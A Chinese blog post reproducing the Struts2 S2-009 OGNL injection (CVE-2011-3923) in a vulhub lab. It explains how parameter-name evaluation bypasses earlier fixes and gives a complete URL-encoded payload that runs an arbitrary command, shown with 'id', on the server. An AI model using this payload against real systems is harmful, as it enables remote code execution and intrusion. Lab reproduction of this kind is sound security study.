# CVE-2011-3923 S2-009 复现 - 美式加糖 - 博客园

> 原文：[`www.cnblogs.com/peace-and-romance/p/15630630.html`](https://www.cnblogs.com/peace-and-romance/p/15630630.html)

### 0X00-引言

学爪哇去了，看不懂源码太难受了，一直在门外晃，不懂原理，构造不出 EXP

### 0X01-环境搭建

* * *

靶机：CentOS Linux 7

攻击机：windows server 2016 && Kail

环境：vulhub

项目地址：[`github.com/vulhub/vulhub`](https://github.com/vulhub/vulhub)

搭建 vulhub 请访问：[空白 centos7 64 搭建 vulhub(详细)](https://www.cnblogs.com/peace-and-romance/p/15621658.html)

### 0X02-漏洞描述

* * *

参考[Struts2 漏洞分析之 Ognl 表达式特性引发的新思路](https://www.t00ls.net/viewthread.php?tid=21197)，文中说到，该引入 ognl 的方法不光可能出现在这个漏洞中，也可能出现在其他 java 应用中。

Struts2 对 s2-003 的修复方法是禁止静态方法调用，在 s2-005 中可直接通过 OGNL 绕过该限制，对于`#`号，同样使用编码`\u0023`或`\43`进行绕过；于是 Struts2 对 s2-005 的修复方法是禁止`\`等特殊符号，使用户不能提交反斜线。

但是，如果当前 action 中接受了某个参数`example`，这个参数将进入 OGNL 的上下文。所以，我们可以将 OGNL 表达式放在`example`参数中，然后使用`/helloword.acton?example=<OGNL statement>&(example)('xxx')=1`的方法来执行它，从而绕过官方对`#`、`\`等特殊字符的防御。

影响版本：2.1.0 - 2.3.1.1

漏洞地址：[`your-ip:8080/ajax/example5.action`](http://your-ip:8080/ajax/example5.action)

### 0X03-漏洞复现

* * *

##### 01-任意命令执行

payload: id 为变量，可修改

```
?age=12313&name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27id%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)] 
```

![image-20211201202126519](img/3c240940ef665f222997205623fbf357.png)

### 0X04-工具检测

* * *

工具地址：[`github.com/Liqunkit/LiqunKit_`](https://github.com/Liqunkit/LiqunKit_)

![image-20211201202909918](img/553b40ceb89129e3e88fef9d19d3eabf.png)

![image-20211201203002680](img/b3b0d32d375d663a89b00817869b8b15.png)

### 0X05-查看日志

* * *

```
docker ps #查看容器 ID
docker exec -it ID /bin/bash #进入
cd logs #进入日志目录
cat localhost_access_log.2021-12-02.txt #查看日志
exit #退出容器 
```

![image-20211201203332232](img/f13ac075727956e77855c6fe9736bdd6.png)

### 0X06-参考

* * *

[S2-009 远程代码执行漏洞](https://github.com/vulhub/vulhub/blob/master/struts2/s2-009/README.zh-cn.md)